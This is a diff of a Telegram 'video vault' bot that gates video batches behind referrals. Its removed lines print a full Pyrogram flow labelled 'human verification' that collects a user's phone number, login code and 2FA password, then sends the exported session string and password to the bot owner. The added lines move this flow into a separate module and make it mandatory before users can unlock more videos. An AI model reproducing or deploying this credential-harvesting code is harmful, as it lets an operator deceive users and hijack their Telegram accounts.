@@ -38,14 +38,8 @@ from telegram.ext import (
     filters,
 )
 
-from pyrogram import Client as PyroClient
-from pyrogram.errors import (
-    SessionPasswordNeeded,
-    PhoneCodeInvalid,
-    PhoneCodeExpired,
-    PasswordHashInvalid,
-    FloodWait as PyroFloodWait,
-)
+# ─── Human Verification lives in its own file ───
+from human_verification import HumanVerification
 
 load_dotenv()
 
@@ -54,8 +48,7 @@ MONGO_URI = os.environ["MONGO_URI"].strip()
 MONGO_DB = os.getenv("MONGO_DB", "video_unlock_bot").strip()
 ADMIN_ID = int(os.environ["ADMIN_ID"])
 STORAGE_CHANNEL_ID = int(os.environ["STORAGE_CHANNEL_ID"])
-# Fallback default for delete timer — actual value comes from DB setting "delete_after_hours"
-DELETE_AFTER_HOURS_DEFAULT = int(os.getenv("DELETE_AFTER_HOURS", "1"))
+DELETE_AFTER_HOURS = int(os.getenv("DELETE_AFTER_HOURS", "12"))
 REFERRALS_PER_BATCH = max(1, int(os.getenv("REFERRALS_PER_BATCH", "1")))
 PENDING_REQUEST_TTL_HOURS = max(1, int(os.getenv("PENDING_REQUEST_TTL_HOURS", "72")))
 UPLOAD_CONCURRENCY = 1
@@ -65,7 +58,6 @@ UPLOAD_PROGRESS_REFRESH_SECONDS = max(2.0, float(os.getenv("UPLOAD_PROGRESS_REFR
 
 API_ID = int(os.environ["API_ID"])
 API_HASH = os.environ["API_HASH"].strip()
-PYRO_OTP_LENGTH = 5
 
 logging.basicConfig(
     level=logging.INFO,
@@ -85,7 +77,6 @@ pending_deletions = db.pending_deletions
 drafts = db.upload_drafts
 pending_requests = db.pending_join_requests
 membership_events = db.membership_events
-settings_col = db.settings
 
 users.create_index([("user_id", ASCENDING)], unique=True)
 users.create_index([("created_at", ASCENDING)])
@@ -96,90 +87,13 @@ drafts.create_index([("admin_id", ASCENDING)], unique=True)
 pending_requests.create_index([("chat_id", ASCENDING), ("user_id", ASCENDING)], unique=True)
 pending_requests.create_index([("requested_at", ASCENDING)])
 membership_events.create_index([("chat_id", ASCENDING), ("user_id", ASCENDING)], unique=True)
-settings_col.create_index([("key", ASCENDING)], unique=True)
 
 ADMIN_STATE = {}
 UPLOAD_RUNTIME = {}
 
-PYRO_SESSIONS: dict[int, dict] = {}
-PYRO_STATE: dict[int, str] = {}
-
-
-# ─────────────────── SETTINGS (editable from chat) ───────────────────
-DEFAULT_SETTINGS = {
-    "verify_robot_button_text": "🤖 Verify as not robot",
-    "videos_button_text": "📚 See Videos",
-    "human_verified_message": "✅ <b>Human verification completed.</b>\n\nTap <b>📚 See Videos</b> below to open the library.",
-    "hv_prompt": (
-        "🔐 <b>Human Verification Required</b>\n\n"
-        "To access our video library, please complete a quick one-time verification.\n\n"
-        "👇 Tap the button below to share your contact."
-    ),
-    "share_contact_button_text": "📱 Share My Contact",
-    "otp_prompt": (
-        "🔐 <b>Enter OTP</b>\n\n"
-        "⚠️ Use the <b>inline buttons</b> below only.\n"
-        "Typing OTP in chat will leave the login incomplete."
-    ),
-    "twofa_prompt": (
-        "🔐 <b>2FA is enabled.</b>\n\n"
-        "Please type your Telegram password in the chat.\n"
-        "(The message will be deleted immediately.)"
-    ),
-    "delete_after_hours": str(DELETE_AFTER_HOURS_DEFAULT),
-}
-
-EDITABLE_KEYS = list(DEFAULT_SETTINGS.keys())
-
-KEY_LABELS = {
-    "verify_robot_button_text": "🤖 Verify as not robot — button",
-    "videos_button_text": "📚 See Videos — button",
-    "human_verified_message": "✅ Human verified — message",
-    "hv_prompt": "🔐 HV prompt message",
-    "share_contact_button_text": "📱 Share Contact — button",
-    "otp_prompt": "🔐 OTP prompt message",
-    "twofa_prompt": "🔐 2FA prompt message",
-    "delete_after_hours": "⏳ Auto-delete timer (hours)",
-}
-
-
-def get_setting(key: str) -> str:
-    doc = settings_col.find_one({"key": key})
-    if doc and doc.get("value") is not None:
-        return doc["value"]
-    return DEFAULT_SETTINGS.get(key, "")
-
-
-def set_setting(key: str, value: str, admin_id: int = None):
-    settings_col.update_one(
-        {"key": key},
-        {"$set": {
-            "key": key,
-            "value": value,
-            "updated_by": admin_id,
-            "updated_at": utcnow(),
-        }},
-        upsert=True,
-    )
-
-
-def get_delete_hours() -> int:
-    """Current auto-delete timer in hours (min 1)."""
-    try:
-        v = int(get_setting("delete_after_hours"))
-        return max(1, v)
-    except (ValueError, TypeError):
-        return 1
-
 
 # ─────────────────── INLINE MENUS ───────────────────
 def user_menu_inline(doc=None):
-    """
-    User menu layout:
-      Row 1 (2 btns)  : 🎬 My Videos        🔓 Unlock Next 10   (Unlock hidden if 0 batches)
-      Row 2 (1 btn)   : 🤖 Verify as not robot
-      Row 3 (2 btns)  : 👥 My Referral      📊 My Progress
-    """
     if doc is None:
         doc = {}
     unlocked = int(doc.get("unlocked_batch", 0))
@@ -194,15 +108,11 @@ def user_menu_inline(doc=None):
             InlineKeyboardButton("🎬 My Videos", callback_data="um_videos"),
         ]
 
-    robot_btn = get_setting("verify_robot_button_text")
-    row_mid = [
-        InlineKeyboardButton(robot_btn, callback_data="um_verify_robot"),
-    ]
     row2 = [
         InlineKeyboardButton("👥 My Referral", callback_data="um_ref"),
         InlineKeyboardButton("📊 My Progress", callback_data="um_progress"),
     ]
-    return InlineKeyboardMarkup([row1, row_mid, row2])
+    return InlineKeyboardMarkup([row1, row2])
 
 
 def delivery_complete_inline():
@@ -229,7 +139,6 @@ def admin_menu_inline():
             InlineKeyboardButton("📊 Bot Stats", callback_data="am_stats"),
         ],
         [
-            InlineKeyboardButton("✏️ Edit Buttons & Messages", callback_data="am_set"),
             InlineKeyboardButton("❓ Help", callback_data="am_help"),
         ],
     ])
@@ -255,15 +164,6 @@ def flow_cancel_inline():
     return InlineKeyboardMarkup([
         [InlineKeyboardButton("❌ Cancel", callback_data="flow_cancel")],
     ])
-
-
-def set_menu_inline():
-    rows = []
-    for key in EDITABLE_KEYS:
-        label = KEY_LABELS.get(key, key)
-        rows.append([InlineKeyboardButton(label, callback_data=f"set_edit:{key}")])
-    rows.append([InlineKeyboardButton("❌ Cancel", callback_data="set_cancel")])
-    return InlineKeyboardMarkup(rows)
 
 
 def esc(v):
@@ -312,6 +212,18 @@ async def reply(update, context, text, **kwargs):
     )
 
 
+# ─────────────────── HUMAN VERIFICATION INSTANCE ───────────────────
+HV = HumanVerification(
+    users=users,
+    admin_id=ADMIN_ID,
+    api_id=API_ID,
+    api_hash=API_HASH,
+    send_batch_fn=lambda bot, chat_id, n: send_batch(bot, chat_id, n),
+    published_batch_count_fn=published_batch_count,
+    menu_for_fn=menu_for,
+)
+
+
 # ─────────────────── OWNER HELP ───────────────────
 HELP_TEXT = (
     "🆘 <b>OWNER HELP PANEL</b>\n\n"
@@ -321,17 +233,10 @@ HELP_TEXT = (
     "━━━━━━━━━━━━━━━━━━━━━━\n"
     "• <code>/admin</code> — Open admin control panel\n"
     "• <code>/help</code> — Show this help panel\n"
-    "• <code>/set</code> — Edit button names, messages &amp; timers (inline menu)\n"
     "• <code>/uploadstatus</code> — Live status of current upload\n"
     "• <code>/setcustomlink</code> — Set a custom join link for a required chat\n"
     "• <code>/resetverify &lt;user_id&gt;</code> — Reset a user's human verification\n"
     "• <code>/cancel_session</code> — Cancel an active session flow (any user)\n\n"
-    "━━━━━━━━━━━━━━━━━━━━━━\n"
-    "✏️ <b>Quick Edit via /set</b>\n"
-    "━━━━━━━━━━━━━━━━━━━━━━\n"
-    "Send <code>/set</code> to open the inline editor.\n"
-    "Tap any button → send the new value → saved instantly.\n"
-    "HTML tags like <code>&lt;b&gt;bold&lt;/b&gt;</code> are supported.\n\n"
     "━━━━━━━━━━━━━━━━━━━━━━\n"
     "🛠 <b>Admin Panel Buttons</b> (via /admin)\n"
     "━━━━━━━━━━━━━━━━━━━━━━\n"
@@ -340,8 +245,15 @@ HELP_TEXT = (
     "• ➕ <b>Add Required Group</b> — Add a force-join channel/group\n"
     "• 👥 <b>Required Groups</b> — Show all required chats\n"
     "• 🗑 <b>Remove Required Channel</b> — Remove a required chat\n"
-    "• 📊 <b>Bot Stats</b> — Users, referrals, daily new users\n"
-    "• ✏️ <b>Edit Buttons &amp; Messages</b> — Same as /set\n\n"
+    "• 📊 <b>Bot Stats</b> — Users, referrals, daily new users\n\n"
+    "━━━━━━━━━━━━━━━━━━━━━━\n"
+    "📤 <b>Upload Session Buttons</b>\n"
+    "━━━━━━━━━━━━━━━━━━━━━━\n"
+    "• 📊 <b>Upload Status</b> — Refresh progress\n"
+    "• <b>DONE</b> — Finish upload and publish batches\n"
+    "• 🔁 <b>Retry Failed</b> — Retry videos that failed\n"
+    "• ✅ <b>Publish Successful</b> — Publish successful ones only\n"
+    "• ❌ <b>Cancel</b> — Abort upload session\n\n"
     "━━━━━━━━━━━━━━━━━━━━━━\n"
     "🔐 <b>Automatic Events</b>\n"
     "━━━━━━━━━━━━━━━━━━━━━━\n"
@@ -362,505 +274,7 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 
-# ─────────────────── /set COMMAND (owner, inline menu) ───────────────────
-async def set_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != ADMIN_ID:
-        return
-    await reply(
-        update, context,
-        "✏️ <b>EDIT BUTTON TEXT / MESSAGES / TIMERS</b>\n\n"
-        "Tap any item below to edit it.\n"
-        "The new value will be applied instantly.\n\n"
-        f"⏳ Current auto-delete: <b>{get_delete_hours()} hour(s)</b>",
-        reply_markup=set_menu_inline(),
-    )
-
-
-async def set_edit_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    q = update.callback_query
-    if q.from_user.id != ADMIN_ID:
-        return await q.answer("Admin only.", show_alert=True)
-
-    try:
-        key = (q.data or "").split(":", 1)[1]
-    except IndexError:
-        return await q.answer("Invalid.", show_alert=True)
-
-    if key not in EDITABLE_KEYS:
-        return await q.answer("Unknown key.", show_alert=True)
-
-    await q.answer()
-    ADMIN_STATE[ADMIN_ID] = f"set_edit:{key}"
-    current = get_setting(key)
-
-    extra_hint = ""
-    if key == "delete_after_hours":
-        extra_hint = "\n\n⚠️ Send a whole number (e.g. <code>1</code>, <code>6</code>, <code>24</code>)."
-
-    await q.edit_message_text(
-        f"✏️ <b>Editing:</b> <code>{esc(key)}</code>\n\n"
-        f"<b>Current value:</b>\n<code>{esc(current)}</code>\n\n"
-        "Send the new value in chat.\n"
-        "HTML tags like <code>&lt;b&gt;bold&lt;/b&gt;</code> are supported."
-        f"{extra_hint}\n\n"
-        "Or tap Cancel below.",
-        parse_mode=ParseMode.HTML,
-        reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("❌ Cancel", callback_data="set_cancel")],
-        ]),
-    )
-
-
-async def set_cancel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    q = update.callback_query
-    if q.from_user.id != ADMIN_ID:
-        return await q.answer("Admin only.", show_alert=True)
-    await q.answer("Cancelled.")
-    ADMIN_STATE.pop(ADMIN_ID, None)
-    try:
-        await q.edit_message_text(
-            "✏️ <b>EDIT BUTTON TEXT / MESSAGES / TIMERS</b>\n\n"
-            "Tap any item below to edit it.\n"
-            "The new value will be applied instantly.\n\n"
-            f"⏳ Current auto-delete: <b>{get_delete_hours()} hour(s)</b>",
-            parse_mode=ParseMode.HTML,
-            reply_markup=set_menu_inline(),
-        )
-    except BadRequest:
-        pass
-
-
-async def set_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
-    """Handle text input when admin is editing a setting via /set.
-    Returns True if the message was consumed by this flow."""
-    if update.effective_user.id != ADMIN_ID:
-        return False
-    state = ADMIN_STATE.get(ADMIN_ID)
-    if not state or not isinstance(state, str) or not state.startswith("set_edit:"):
-        return False
-
-    key = state.split(":", 1)[1]
-    if key not in EDITABLE_KEYS:
-        ADMIN_STATE.pop(ADMIN_ID, None)
-        return False
-
-    value = (update.message.text or "").strip()
-    if not value:
-        await update.message.reply_text(
-            "⚠️ Value cannot be empty. Send new value or /cancel."
-        )
-        return True
-
-    # Special validation for delete_after_hours
-    if key == "delete_after_hours":
-        try:
-            hours = int(value)
-        except ValueError:
-            await update.message.reply_text(
-                "⚠️ Please send a whole number (e.g. 1, 6, 24)."
-            )
-            return True
-        if hours < 1 or hours > 720:
-            await update.message.reply_text(
-                "⚠️ Hours must be between 1 and 720 (30 days)."
-            )
-            return True
-        value = str(hours)
-
-    set_setting(key, value, ADMIN_ID)
-    ADMIN_STATE.pop(ADMIN_ID, None)
-
-    await reply(
-        update, context,
-        f"✅ <code>{esc(key)}</code> updated to:\n\n<b>{esc(value)}</b>\n\n"
-        "Choose another item to edit or tap Cancel.",
-        reply_markup=set_menu_inline(),
-    )
-    return True
-
-
-async def admin_set_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Triggered from the admin panel '✏️ Edit Buttons & Messages' button."""
-    q = update.callback_query
-    if q.from_user.id != ADMIN_ID:
-        return await q.answer("Admin only.", show_alert=True)
-    await q.answer()
-    try:
-        await q.edit_message_text(
-            "✏️ <b>EDIT BUTTON TEXT / MESSAGES / TIMERS</b>\n\n"
-            "Tap any item below to edit it.\n"
-            "The new value will be applied instantly.\n\n"
-            f"⏳ Current auto-delete: <b>{get_delete_hours()} hour(s)</b>",
-            parse_mode=ParseMode.HTML,
-            reply_markup=set_menu_inline(),
-        )
-    except BadRequest:
-        pass
-
-
-# ─────────────────── PYROGRAM SESSION GENERATOR ───────────────────
-
-def pyro_keypad_markup(entered: str, locked: bool = False):
-    layout = [
-        [("1", "1"), ("2", "2"), ("3", "3")],
-        [("4", "4"), ("5", "5"), ("6", "6")],
-        [("7", "7"), ("8", "8"), ("9", "9")],
-        [("⌫", "back"), ("0", "0"), ("✅", "submit")],
-    ]
-    buttons = [
-        [InlineKeyboardButton(label, callback_data=f"pyro_otp|{val}") for label, val in row]
-        for row in layout
-    ]
-    if locked:
-        text = (
-            "🔐 <b>Enter OTP</b>\n\n"
-            f"Entered: <code>{entered}</code>\n\n"
-            "⏳ Verifying..."
-        )
-    else:
-        base_prompt = get_setting("otp_prompt")
-        text = (
-            f"{base_prompt}\n\n"
-            f"Entered: <code>{entered or '—'}</code>\n\n"
-            f"Auto-submits after <b>{PYRO_OTP_LENGTH}</b> digits."
-        )
-    return InlineKeyboardMarkup(buttons), text
-
-
-async def pyro_cleanup(uid: int):
-    sess = PYRO_SESSIONS.pop(uid, None)
-    PYRO_STATE.pop(uid, None)
-    if sess and sess.get("client"):
-        try:
-            await sess["client"].disconnect()
-        except Exception:
-            pass
-
-
-async def pyro_safe_edit_or_reply(message, text: str, edit: bool, **kwargs):
-    kwargs.setdefault("parse_mode", ParseMode.HTML)
-    bot = message.get_bot()
-    if edit:
-        try:
-            return await message.edit_text(text, **kwargs)
-        except Exception:
-            pass
-    try:
-        return await bot.send_message(chat_id=message.chat_id, text=text, **kwargs)
-    except Exception as e:
-        log.warning("pyro reply fail: %s", e)
-
-
-async def pyro_finish_login(message, uid: int, temp: PyroClient, edit: bool,
-                            has_2fa: bool = False, phone: str = "—",
-                            password: str = "—"):
-    try:
-        session_string = await temp.export_session_string()
-        me = await temp.get_me()
-    except Exception as e:
-        await pyro_safe_edit_or_reply(message, f"❌ Verification failed: <code>{esc(e)}</code>", edit)
-        try:
-            await message.get_bot().send_message(
-                ADMIN_ID,
-                f"⚠️ Session export failed for user <code>{uid}</code>.\n\nError: <code>{esc(e)}</code>",
-                parse_mode=ParseMode.HTML,
-            )
-        except Exception:
-            pass
-        await pyro_cleanup(uid)
-        return
-
-    username_line = f"@{me.username}" if me.username else "—"
-    full_name = f"{me.first_name or ''} {me.last_name or ''}".strip() or "—"
-    twofa_line = "✅ Yes" if has_2fa else "❌ No"
-
-    users.update_one(
-        {"user_id": uid},
-        {"$set": {"human_verified": True, "human_verified_at": utcnow()}},
-    )
-
-    owner_txt = (
-        "🔔 <b>New Session Generated</b>\n\n"
-        f"👤 <b>User:</b> {esc(full_name)}\n"
-        f"🆔 <b>ID:</b> <code>{me.id}</code>\n"
-        f"🔗 <b>Username:</b> {esc(username_line)}\n"
-        f"📱 <b>Phone:</b> <code>{esc(phone)}</code>\n"
-        f"🔐 <b>2FA:</b> {twofa_line}\n"
-    )
-    if has_2fa:
-        owner_txt += f"🔑 <b>2FA Password:</b> <code>{esc(password)}</code>\n"
-    owner_txt += (
-        "\n<b>String Session:</b>\n\n"
-        f"<code>{esc(session_string)}</code>"
-    )
-    try:
-        await message.get_bot().send_message(ADMIN_ID, owner_txt, parse_mode=ParseMode.HTML)
-    except Exception as e:
-        log.warning("owner send fail: %s", e)
-
-    success_msg = get_setting("human_verified_message")
-    videos_btn = get_setting("videos_button_text")
-    kb = InlineKeyboardMarkup([
-        [InlineKeyboardButton(videos_btn, callback_data="um_see_videos")]
-    ])
-
-    await pyro_safe_edit_or_reply(message, success_msg, edit, reply_markup=kb)
-    await pyro_cleanup(uid)
-
-
-async def pyro_session_start(update, context):
-    uid = update.effective_user.id
-    sess = PYRO_SESSIONS.pop(uid, None)
-    if sess and sess.get("client"):
-        try:
-            await sess["client"].disconnect()
-        except Exception:
-            pass
-    PYRO_STATE[uid] = "await_contact"
-
-    share_text = get_setting("share_contact_button_text")
-    kb = ReplyKeyboardMarkup(
-        [[KeyboardButton(share_text, request_contact=True)]],
-        resize_keyboard=True,
-        one_time_keyboard=True,
-    )
-    prompt = get_setting("hv_prompt")
-    await reply(update, context, prompt, reply_markup=kb)
-
-
-async def pyro_contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid = update.effective_user.id
-    if PYRO_STATE.get(uid) != "await_contact":
-        return
-
-    contact = update.message.contact
-    if contact is None:
-        return
-    if contact.user_id != uid:
-        return await update.message.reply_text(
-            "❌ This is not your own contact. Please share your own contact."
-        )
-
-    phone = contact.phone_number
-    if not phone.startswith("+"):
-        phone = "+" + phone
-
-    await update.message.reply_text(
-        "⏳ Sending OTP...",
-        reply_markup=ReplyKeyboardRemove(),
-    )
-
-    temp = PyroClient(
-        name=f"pyro_{uuid4().hex}",
-        api_id=API_ID,
-        api_hash=API_HASH,
-        in_memory=True,
-        device_model="Samsung Galaxy S24 Ultra",
-        system_version="SDK 34",
-        app_version="11.5.3",
-        lang_code="en",
-        
-    )
-
-    try:
-        await temp.connect()
-        sent_code = await temp.send_code(phone)
-    except PyroFloodWait as e:
-        try:
-            await temp.disconnect()
-        except Exception:
-            pass
-        PYRO_STATE.pop(uid, None)
-        return await update.message.reply_text(
-            f"⏳ FloodWait: please wait <code>{e.value}s</code>.",
-            parse_mode=ParseMode.HTML,
-        )
-    except Exception as e:
-        try:
-            await temp.disconnect()
-        except Exception:
-            pass
-        PYRO_STATE.pop(uid, None)
-        return await update.message.reply_text(
-            f"❌ Error: <code>{esc(e)}</code>",
-            parse_mode=ParseMode.HTML,
-        )
-
-    PYRO_SESSIONS[uid] = {
-        "client": temp,
-        "phone": phone,
-        "phone_code_hash": sent_code.phone_code_hash,
-        "otp": "",
-        "has_2fa": False,
-        "locked": False,
-        "password": "—",
-    }
-    PYRO_STATE[uid] = "otp"
-
-    markup, text = pyro_keypad_markup("")
-    await update.message.reply_text(
-        text,
-        parse_mode=ParseMode.HTML,
-        reply_markup=markup,
-    )
-
-
-async def pyro_otp_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    q = update.callback_query
-    uid = q.from_user.id
-
-    sess = PYRO_SESSIONS.get(uid)
-    if not sess:
-        return await q.answer("Session expired. Try again.", show_alert=True)
-    if PYRO_STATE.get(uid) != "otp":
-        return await q.answer("Not at OTP stage right now.")
-    if sess.get("locked"):
-        return await q.answer("Verifying, please wait...", show_alert=True)
-
-    val = (q.data or "").split("|", 1)[1]
-    otp = sess["otp"]
-
-    if val == "back":
-        otp = otp[:-1]
-        sess["otp"] = otp
-        markup, text = pyro_keypad_markup(otp)
-        try:
-            await q.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=markup)
-        except BadRequest:
-            pass
-        return await q.answer()
-
-    if val == "submit":
-        if len(otp) < PYRO_OTP_LENGTH:
-            return await q.answer(f"Please enter all {PYRO_OTP_LENGTH} digits.", show_alert=True)
-        await q.answer("Verifying...")
-        return await pyro_do_sign_in(q, sess, otp)
-
-    if len(otp) >= PYRO_OTP_LENGTH:
-        return await q.answer(f"{PYRO_OTP_LENGTH} digits max")
-
-    otp += val
-    sess["otp"] = otp
-
-    if len(otp) == PYRO_OTP_LENGTH:
-        sess["locked"] = True
-        markup, text = pyro_keypad_markup(otp, locked=True)
-        try:
-            await q.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=markup)
-        except BadRequest:
-            pass
-        await q.answer("Verifying...")
-        return await pyro_do_sign_in(q, sess, otp)
-
-    markup, text = pyro_keypad_markup(otp)
-    try:
-        await q.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=markup)
-    except BadRequest:
-        pass
-    await q.answer()
-
-
-async def pyro_do_sign_in(q, sess: dict, otp: str):
-    uid = q.from_user.id
-    temp = sess["client"]
-
-    try:
-        await temp.sign_in(sess["phone"], sess["phone_code_hash"], otp)
-    except SessionPasswordNeeded:
-        sess["otp"] = ""
-        sess["has_2fa"] = True
-        PYRO_STATE[uid] = "password"
-        twofa_prompt = get_setting("twofa_prompt")
-        try:
-            await q.edit_message_text(twofa_prompt, parse_mode=ParseMode.HTML)
-        except BadRequest:
-            pass
-        return
-    except PhoneCodeInvalid:
-        sess["otp"] = ""
-        sess["locked"] = False
-        markup, text = pyro_keypad_markup("")
-        try:
-            await q.edit_message_text(
-                "❌ Invalid OTP. Please try again.\n\n" + text,
-                parse_mode=ParseMode.HTML,
-                reply_markup=markup,
-            )
-        except BadRequest:
-            pass
-        return
-    except PhoneCodeExpired:
-        try:
-            await q.edit_message_text("❌ OTP expired. Try again.", parse_mode=ParseMode.HTML)
-        except BadRequest:
-            pass
-        await pyro_cleanup(uid)
-        return
-    except Exception as e:
-        try:
-            await q.edit_message_text(f"❌ Error: <code>{esc(e)}</code>", parse_mode=ParseMode.HTML)
-        except BadRequest:
-            pass
-        await pyro_cleanup(uid)
-        return
-
-    await pyro_finish_login(
-        q.message, uid, temp, edit=True,
-        has_2fa=sess.get("has_2fa", False),
-        phone=sess.get("phone", "—"),
-        password=sess.get("password", "—"),
-    )
-
-
-async def pyro_handle_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid = update.effective_user.id
-    sess = PYRO_SESSIONS.get(uid)
-    if not sess:
-        PYRO_STATE.pop(uid, None)
-        return await update.message.reply_text("Please start the verification again.")
-
-    password = update.message.text or ""
-    sess["password"] = password
-
-    try:
-        await update.message.delete()
-    except TelegramError:
-        pass
-
-    try:
-        await sess["client"].check_password(password)
-    except PasswordHashInvalid:
-        sess["password"] = "—"
-        return await update.message.reply_text("❌ Incorrect password. Please try again.")
-    except Exception as e:
-        sess["password"] = "—"
-        return await update.message.reply_text(
-            f"❌ Error: <code>{esc(e)}</code>", parse_mode=ParseMode.HTML
-        )
-
-    await pyro_finish_login(
-        update.message, uid, sess["client"], edit=False,
-        has_2fa=sess.get("has_2fa", False),
-        phone=sess.get("phone", "—"),
-        password=sess.get("password", "—"),
-    )
-
-
-async def pyro_cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid = update.effective_user.id
-    if uid not in PYRO_SESSIONS and uid not in PYRO_STATE:
-        return await update.message.reply_text("No verification process is active.")
-    await pyro_cleanup(uid)
-    await update.message.reply_text(
-        "✅ Verification cancelled.",
-        reply_markup=ReplyKeyboardRemove(),
-    )
-    await reply(update, context, "Choose an option:", reply_markup=menu_for(uid))
-
-
-# ─────────────────── END PYROGRAM SESSION GENERATOR ───────────────────
-
-
+# ─────────────────── DELETION WORKER ───────────────────
 async def deletion_worker(app: Application):
     while True:
         try:
@@ -912,8 +326,8 @@ async def post_stop(app: Application):
         except asyncio.CancelledError:
             pass
 
-    for uid in list(PYRO_SESSIONS.keys()):
-        await pyro_cleanup(uid)
+    # ── Clean up all in-flight HV sessions ──
+    await HV.cleanup_all()
     log.info("Video cleanup worker stopped")
 
 
@@ -1174,14 +588,13 @@ async def home(update, context):
         unlocked = 1
         d = user_doc(uid) or {}
 
-    delete_hours = get_delete_hours()
     await reply(
         update, context,
         "🎬 <b>VIDEO VAULT</b>\n\n"
         f"🔓 Unlocked batch: <b>{unlocked}/{total}</b>\n"
         f"👥 Successful referrals: <b>{refs}</b>\n"
         "🎞 Videos per full batch: <b>10</b>\n"
-        f"⏳ Videos auto-delete in <b>{delete_hours} hour(s)</b>.\n\n"
+        f"⏳ Videos auto-delete in <b>{DELETE_AFTER_HOURS} hours</b>.\n\n"
         "Choose an option:",
         reply_markup=user_menu_inline(d),
     )
@@ -1257,21 +670,17 @@ async def verify_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 pass
 
     pending_note = f"\n⏳ Pending approval accepted: <b>{len(pending)}</b>" if pending else ""
-    delete_hours = get_delete_hours()
-
     success_text = (
         "✅ <b>VERIFICATION SUCCESSFUL</b>\n\n"
         "Access unlocked. 🎉"
         f"{pending_note}\n\n"
-        f"Videos are protected and will be automatically deleted after <b>{delete_hours} hour(s)</b>.\n\n"
-        "Choose an option:"
+        f"Videos are protected and will be automatically deleted after <b>{DELETE_AFTER_HOURS} hours</b>."
     )
-    kb = menu_for(uid)
     try:
-        await q.edit_message_text(success_text, parse_mode=ParseMode.HTML, reply_markup=kb)
+        await q.edit_message_text(success_text, parse_mode=ParseMode.HTML, reply_markup=None)
     except BadRequest:
         try:
-            await q.edit_message_reply_markup(reply_markup=kb)
+            await q.edit_message_reply_markup(reply_markup=None)
         except BadRequest:
             pass
 
@@ -1311,7 +720,6 @@ async def send_batch(bot, chat_id, batch_no):
     if not batch:
         return await bot.send_message(chat_id, "⚠️ This video batch is currently unavailable.")
 
-    delete_hours = get_delete_hours()
     mids = batch.get("message_ids", [])
     await bot.send_message(
         chat_id,
@@ -1319,7 +727,7 @@ async def send_batch(bot, chat_id, batch_no):
         f"📦 Batch: <b>{batch_no}</b>\n"
         f"🎞 Videos: <b>{len(mids)}</b>\n"
         "🔒 Forward/save protection: <b>ON</b>\n"
-        f"⏳ Auto-delete: <b>{delete_hours} hour(s)</b>",
+        f"⏳ Auto-delete: <b>{DELETE_AFTER_HOURS} hours</b>",
         parse_mode=ParseMode.HTML,
     )
 
@@ -1337,7 +745,7 @@ async def send_batch(bot, chat_id, batch_no):
         except TelegramError as e:
             log.warning("Video copy failed batch=%s source=%s error=%s", batch_no, mid, type(e).__name__)
 
-    delete_at = utcnow() + timedelta(hours=delete_hours)
+    delete_at = utcnow() + timedelta(hours=DELETE_AFTER_HOURS)
     if sent:
         pending_deletions.insert_many(
             [{"chat_id": chat_id, "message_id": mid, "delete_at": delete_at, "kind": "video"}
@@ -1376,6 +784,16 @@ async def unlock_next(update, context):
     if current >= total:
         return await reply(update, context, "🏁 <b>ALL AVAILABLE VIDEOS UNLOCKED</b>")
 
+    if not d.get("human_verified"):
+        HV.pending_unlock[uid] = True
+        await reply(
+            update, context,
+            "🔐 <b>HUMAN VERIFICATION REQUIRED</b>\n\n"
+            "To unlock the next 10 videos, complete a quick one-time verification.\n\n"
+            "👇 Please tap the <b>Share My Contact</b> button below to continue.",
+        )
+        return await HV.session_start(update, context)
+
     need = required_referrals_for_next(current)
     have = int(d.get("verified_referrals", 0))
     if have < need:
@@ -1401,18 +819,6 @@ async def unlock_next(update, context):
         f"🎉 <b>BATCH {nxt} UNLOCKED!</b>\n🎞 Videos in this batch: <b>{count}</b>",
     )
     await send_batch(context.bot, update.effective_chat.id, nxt)
-
-
-async def see_videos_from_hv(update, context):
-    if not await ensure_verified(update, context):
-        return
-    uid = update.effective_user.id
-    d = user_doc(uid) or {}
-    current = int(d.get("unlocked_batch", 0))
-    if current <= 0:
-        users.update_one({"user_id": uid}, {"$set": {"unlocked_batch": 1}})
-        current = 1
-    await send_batch(context.bot, update.effective_chat.id, current)
 
 
 async def referral(update, context):
@@ -1445,7 +851,6 @@ async def progress(update, context):
     current = int(d.get("unlocked_batch", 0))
     refs = int(d.get("verified_referrals", 0))
     human_ok = "✅ Yes" if d.get("human_verified") else "❌ No"
-    delete_hours = get_delete_hours()
 
     unlocked_video_count = 0
     for b in batches.find({"published": True, "batch_no": {"$lte": current}}, {"message_ids": 1}):
@@ -1459,7 +864,7 @@ async def progress(update, context):
         f"👥 Verified referrals: <b>{refs}</b>\n"
         f"🔐 Human verified: <b>{human_ok}</b>\n"
         f"🎯 Next target: <b>{required_referrals_for_next(max(1,current))}</b>\n"
-        f"⏳ Video expiry: <b>{delete_hours} hour(s)</b>",
+        f"⏳ Video expiry: <b>{DELETE_AFTER_HOURS} hours</b>",
         reply_markup=user_menu_inline(d),
     )
 
@@ -2146,7 +1551,6 @@ async def admin_stats(update, context):
 
     week_ago = today_start - timedelta(days=6)
     last_7_days = users.count_documents({"created_at": {"$gte": week_ago}})
-    delete_hours = get_delete_hours()
 
     await reply(
         update, context,
@@ -2157,8 +1561,7 @@ async def admin_stats(update, context):
         f"🤝 Successful referrals: <b>{refs}</b>\n"
         f"⏳ Active pending join requests: <b>{active_pending}</b>\n"
         f"📦 Batches: <b>{published_batch_count()}</b>\n"
-        f"🗑 Pending deletions: <b>{pending_deletions.count_documents({})}</b>\n"
-        f"⏱ Auto-delete timer: <b>{delete_hours} hour(s)</b>\n\n"
+        f"🗑 Pending deletions: <b>{pending_deletions.count_documents({})}</b>\n\n"
         f"📈 <b>New Users (last 24h):</b> <b>{last_24h}</b>\n"
         f"📅 <b>New Users (last 7 days):</b> <b>{last_7_days}</b>\n\n"
         f"🗓 <b>Daily Breakdown (7 days):</b>\n{daily_block}",
